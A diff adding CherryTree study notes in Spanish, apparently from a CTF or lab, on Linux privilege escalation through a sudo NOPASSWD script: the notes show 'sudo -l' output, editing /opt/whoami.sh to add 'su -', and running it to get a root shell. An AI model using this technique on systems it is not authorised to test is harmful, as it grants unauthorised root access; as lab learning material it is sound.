@@ -1,0 +1,44 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node unique_id="9" master_id="0" name="Basica" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1774759830" ts_lastsave="1774760114">
+    <rich_text>una vez ya dentro del sistema en un usuario corriente lo que aremos sera ver que scripts puede correr el usuario con permisos de administrador:
+
+			sudo -l
+			
+Donde se nosm mostrara los scripts que podemos correr, si aparece uno sin contrasenia ya chingamos, pero si no no pasa nada, se ejecuta igual.
+
+editamos con nano el codigo del script, colocandole dentro los comandos que querramos hacer con root o incluso haciendo un su -, esto solo funciona si en un NOPASS.
+
+ejemplo: 
+
+
+
+al hacer nano sobre /opt/whoami.sh
+
+
+
+al correr el script: 
+
+</rich_text>
+    <codebox char_offset="481" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="plain-text" highlight_brackets="1" show_line_numbers="0">jane@13a2eae5fc00:~$ sudo -l
+Matching Defaults entries for jane on 13a2eae5fc00:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User jane may run the following commands on 13a2eae5fc00:
+    (ALL : ALL) NOPASSWD: /opt/whoami.sh
+</codebox>
+    <codebox char_offset="520" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="plain-text" highlight_brackets="1" show_line_numbers="0">  GNU nano 7.2                                     /opt/whoami.sh                                              
+#!/bin/bash
+
+whoami
+
+ls /root
+
+su -</codebox>
+    <codebox char_offset="546" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="plain-text" highlight_brackets="1" show_line_numbers="0">jane@13a2eae5fc00:~$ sudo /opt/whoami.sh 
+root
+root.txt
+root@13a2eae5fc00:~# </codebox>
+  </node>
+</cherrytree>
